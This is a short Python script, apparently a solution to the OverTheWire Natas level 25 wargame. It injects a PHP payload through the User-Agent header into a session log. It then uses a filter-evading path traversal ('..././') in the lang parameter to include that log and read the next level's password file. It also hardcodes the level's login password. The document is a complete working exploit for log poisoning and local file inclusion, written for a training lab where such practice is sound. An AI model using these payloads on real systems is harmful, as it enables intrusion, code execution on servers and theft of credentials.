import re, requests
USER = 'natas25'
PASS = 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'
URL = f'http://{USER}.natas.labs.overthewire.org/'
AUTH_BASIC = requests.auth.HTTPBasicAuth(USER, PASS)

burp = {"http": "http://127.0.0.1:8080"}
user_agent = {"User-Agent": "<?php echo readfile('/etc/natas_webpass/natas26');?>"}

def get_natas25_password():
    session = requests.Session()
    get = session.get(url=URL, auth=AUTH_BASIC, proxies=burp)
    cookie = str(get.cookies.copy())
    splits = cookie.split("=")[1]
    sid = re.search('([0-9a-z]){26}', splits)
    payload_param = f'?lang=..././..././..././..././..././var/www/natas/natas25/logs/natas25_{sid[0]}.log'
    request = session.get(url=URL + payload_param, auth=AUTH_BASIC, headers=user_agent, proxies=burp)
    flag = str(re.search(r'][^]]+\n', request.text))
    password = flag.split(']')[1][1: -16]
    return password

passwd = get_natas25_password()
print('The password for natas26 is:',passwd)